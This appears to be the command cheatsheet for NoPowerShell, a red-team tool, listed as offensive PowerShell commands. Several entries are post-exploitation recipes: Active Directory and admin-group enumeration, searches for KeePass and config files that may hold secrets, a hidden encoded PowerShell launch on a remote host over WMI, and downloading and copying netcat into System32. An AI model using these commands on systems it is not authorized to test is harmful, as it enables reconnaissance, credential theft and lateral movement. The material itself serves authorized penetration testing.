# Cheatsheet
Cheatsheet of offensive PowerShell commands that are supported by NoPowerShell.

| Action | Command | Alternative |
| - | - | - |
| Get the sites from the configuration naming context | `Get-ADObject -LDAPFilter "(objectClass=site)" -SearchBase "CN=Configuration,DC=MyDomain,DC=local" -Properties whenCreated,cn` |  |
| Get specific object | `Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=MyDomain,DC=local" -Properties *` |  |
| List all global groups | `Get-ADObject -LDAPFilter "(GroupType:1.2.840.113556.1.4.803:=2)" -SearchBase "DC=MyDomain,DC=local"` |  |
| List trusts | `Get-ADTrust` |  |
| List trusts recursively till depth 3 | `Get-ADTrust -Depth 3` |  |
| List all details of a certain trust | `Get-ADTrust -LDAPFilter "(Name=mydomain.com)"` |  |
| List specific details of a certain trust | `Get-ADTrust -LDAPFilter "(Name=mydomain.com)" -Properties Name,trustDirection,securityIdentifier` |  |
| List all user groups in domain | `Get-ADGroup -Filter *` |  |
| List all administrative groups in domain | `Get-ADGroup -LDAPFilter "(admincount=1)" \| select Name` |  |
| List all members of the "Domain Admins" group | `Get-ADGroupMember -Identity "Domain Admins"` | `Get-ADGroupMember "Domain Admins"` |
| List all properties of the DC01 domain computer | `Get-ADComputer -Identity DC01 -Properties *` |  |
| List all Domain Controllers | `Get-ADComputer -LDAPFilter "(msDFSR-ComputerReferenceBL=*)"` |  |
| List all computers in domain | `Get-ADComputer -Filter *` |  |
| List specific attributes of the DC01 domain computer | `Get-ADComputer DC01 -Properties Name,operatingSystem` |  |
| List all properties of the Administrator domain user | `Get-ADUser -Identity Administrator -Properties *` |  |
| List all Administrative users in domain | `Get-ADUser -LDAPFilter "(admincount=1)"` |  |
| List all users in domain | `Get-ADUser -Filter *` |  |
| List specific attributes of user | `Get-ADUser Administrator -Properties SamAccountName,ObjectSID` |  |
| List all users in a specific OU | `Get-ADUser -SearchBase "CN=Users,DC=MyDomain,DC=local" -Filter *` |  |
| Show the current user | `whoami` |  |
| List SMB shares of MyServer | `Get-RemoteSmbShare \\MyServer` |  |
| Extract zip | `Expand-Archive -Path C:\MyArchive.zip -DestinationPath C:\Extracted` | `unzip C:\MyArchive.zip C:\Extracted` |
| Extract zip into current directory | `unzip C:\MyArchive.zip` |  |
| Compress folder to zip | `Compress-Archive -Path C:\MyFolder -DestinationPath C:\MyFolder.zip` | `zip C:\MyFolder C:\MyFolder.zip` |
| List all processes containing PowerShell in the process name | `Get-Process \| ? Name -Like *PowerShell*` |  |
| List all active local users | `Get-LocalUser \| ? Disabled -EQ False` |  |
| Get help for a command | `Get-Help -Name Get-Process` | `man ps` |
| List all commands supported by NoPowerShell | `Get-Command` |  |
| List commands of a certain module | `Get-Command -Module ActiveDirectory` |  |
| Resolve domain name | `Resolve-DnsName microsoft.com` | `host linux.org` |
| Lookup specific record | `Resolve-DnsName -Type MX pm.me` |  |
| Reverse DNS lookup | `Resolve-DnsName 1.1.1.1` |  |
| List all active members of the Administrators group | `Get-LocalGroupMember -Group Administrators \| ? Disabled -eq False` |  |
| List all local groups | `Get-LocalGroup` |  |
| List details of a specific group | `Get-LocalGroup Administrators` |  |
| List members of Administrators group on a remote computer using WMI | `Get-LocalGroup -ComputerName Myserver -Username MyUser -Password MyPassword -Name Administrators` | `Get-LocalGroup -ComputerName Myserver -Name Administrators` |
| List all local users | `Get-LocalUser` |  |
| List details of a specific user | `Get-LocalUser -Name Administrator` | `Get-LocalUser Administrator` |
| List details of a specific user on a remote machine using WMI | `Get-LocalUser -ComputerName MyServer -Username MyUser -Password MyPassword -Name Administrator` | `Get-LocalUser -ComputerName MyServer Administrator` |
| List drives | `Get-PSDrive` | `gdr` |
| View contents of a file | `Get-Content C:\Windows\WindowsUpdate.log` | `cat C:\Windows\WindowsUpdate.log` |
| Get all hotfixes on the local computer | `Get-HotFix` |  |
| Get all hotfixes from a remote computer using WMI | `Get-HotFix -ComputerName MyServer -Username Administrator -Password Pa$$w0rd` | `Get-HotFix -ComputerName MyServer` |
| Locate KeePass files in the C:\Users\ directory | `Get-ChildItem -Recurse -Force C:\Users\ -Include *.kdbx` | `ls -Recurse -Force C:\Users\ -Include *.kdbx` |
| List the keys under the SOFTWARE key in the registry | `ls HKLM:\SOFTWARE` |  |
| Search for files which can contain sensitive data on the C-drive | `ls -Recurse -Force C:\ -Include *.xml,*.ini,*.txt,*.cmd,*.bat,*.conf,*.config,*.log,*.reg,*.ps1,*.psm1,*.psd1,*.ps1xml,*.psc1,*.rdp,*.rdg,*.url,*.sql` |  |
| List local shares | `Get-WmiObject -Namespace ROOT\CIMV2 -Query "Select * From Win32_Share Where Name LIKE '%$'"` | `gwmi -Class Win32_Share -Filter "Name LIKE '%$'"` |
| Obtain data of Win32_Process class from a remote system and apply a filter on the output | `Get-WmiObject "Select ProcessId,Name,CommandLine From Win32_Process" -ComputerName dc01.corp.local -Username MyUser -Password MyPassword \| ? Name -Like *PowerShell* \| select ProcessId,CommandLine` | `gwmi "Select ProcessId,Name,CommandLine From Win32_Process" -ComputerName dc01.corp.local \| ? Name -Like *PowerShell* \| select ProcessId,CommandLine` |
| View details about a certain service | `Get-WmiObject -Class Win32_Service -Filter "Name = 'WinRM'"` |  |
| List processes | `Get-Process` | `ps` |
| List processes on remote host using WMI | `Get-Process -ComputerName dc01.corp.local -Username Administrator -Password P4ssw0rd!` | `ps -ComputerName dc01.corp.local` |
| Gracefully stop processes | `Stop-Process -Id 4512,7241` |  |
| Kill process | `Stop-Process -Force -Id 4512` |  |
| Kill all cmd.exe processes | `Get-Process cmd \| Stop-Process -Force` |  |
| Show information about the system | `Get-ComputerInfo` | `systeminfo` |
| Show information about the system not listing patches | `systeminfo -Simple` |  |
| Show information about a remote machine using WMI | `Get-ComputerInfo -ComputerName MyServer -Username MyUser -Password MyPassword` | `Get-ComputerInfo -ComputerName MyServer` |
| Launch process | `Invoke-WmiMethod -Class Win32_Process -Name Create "cmd /c calc.exe"` |  |
| Launch process on remote system | `Invoke-WmiMethod -ComputerName MyServer -Username MyUserName -Password MyPassword -Class Win32_Process -Name Create "powershell -NoP -W H -E ZQBjAGgAbwAgACcASABlAGwAbABvACAATgBvAFAAbwB3AGUAcgBTAGgAZQBsAGwAIQAnAA=="` | `iwmi -ComputerName MyServer -Class Win32_Process -Name Create "powershell -NoP -W H -E ZQBjAGgAbwAgACcASABlAGwAbABvACAATgBvAFAAbwB3AGUAcgBTAGgAZQBsAGwAIQAnAA=="` |
| Delete a file | `Remove-Item C:\tmp\MyFile.txt` | `rm C:\tmp\MyFile.txt` |
| Delete a read-only file | `Remove-Item -Force C:\Tmp\MyFile.txt` |  |
| Recursively delete a folder | `Remove-Item -Recurse C:\Tmp\MyTools\` |  |
| List autoruns in the registry | `Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run \| ft` |  |
| Copy file from one location to another | `Copy-Item C:\Tmp\nc.exe C:\Windows\System32\nc.exe` | `copy C:\Tmp\nc.exe C:\Windows\System32\nc.exe` |
| Copy folder | `copy C:\Tmp\MyFolder C:\Tmp\MyFolderBackup` |  |
| Send ICMP request to host | `Test-NetConnection 1.1.1.1` | `tnc 1.1.1.1` |
| Send 2 ICMP requests to IP address 1.1.1.1 with half a second of timeout | `Test-NetConnection -Count 2 -Timeout 500 1.1.1.1` |  |
| Perform a traceroute with a timeout of 1 second and a maximum of 20 hops | `Test-NetConnection -TraceRoute -Timeout 1000 -Hops 20 bitsadm.in` |  |
| Perform ping with maximum TTL specified | `ping -TTL 32 1.1.1.1` |  |
| Check for open port | `tnc bitsadm.in -Port 80` |  |
| List ARP table entries | `Get-NetNeighbor` | `arp` |
| Show the IP routing table | `Get-NetRoute` | `route` |
| Show the IP routing table on a remote machine using WMI | `Get-NetRoute -ComputerName MyServer -Username MyUser -Password MyPassword` | `route -ComputerName MyServer` |
| Show network interfaces | `Get-NetIPAddress` | `ipconfig`, `ifconfig` |
| Show all network interfaces | `Get-NetIPAddress -All` | `ipconfig -All` |
| Show all network interfaces on a remote machine using WMI | `Get-NetIPAddress -All -ComputerName MyServer -Username MyUser -Password MyPassword` | `Get-NetIPAddress -All -ComputerName MyServer` |
| List SMB shares on the computer | `Get-SmbShare` |  |
| List network shares on the local machine that are exposed to the network | `Get-SmbMapping` | `netuse` |
| Count number of results | `Get-Process \| Measure-Object` | `Get-Process \| measure` |
| Count number of lines in file | `gc C:\Windows\WindowsUpdate.log \| measure` |  |
| Download file from the Internet | `Invoke-WebRequest http://myserver.me/nc.exe` | `wget http://myserver.me/nc.exe` |
| Download file from the Internet specifying the destination | `wget http://myserver.me/nc.exe -OutFile C:\Tmp\netcat.exe` |  |
| Show only the Name in a file listing | `ls C:\ \| select Name` |  |
| Show first 10 results of file listing | `ls C:\Windows\System32 -Include *.exe \| select -First 10 Name,Length` |  |
| Sort processes by name descending | `ps \| sort -d name` |  |
| Format output as a table | `Get-Process \| Format-Table` | `Get-Process \| ft` |
| Format output as a table showing only specific attributes | `Get-Process \| ft ProcessId,Name` |  |
| Format output as a list | `Get-LocalUser \| Format-List` | `Get-LocalUser \| fl` |
| Format output as a list showing only specific attributes | `Get-LocalUser \| fl Name,Description` |  |
| Store list of commands as CSV | `Get-Command \| Export-Csv -Encoding ASCII -Path commands.csv` |  |
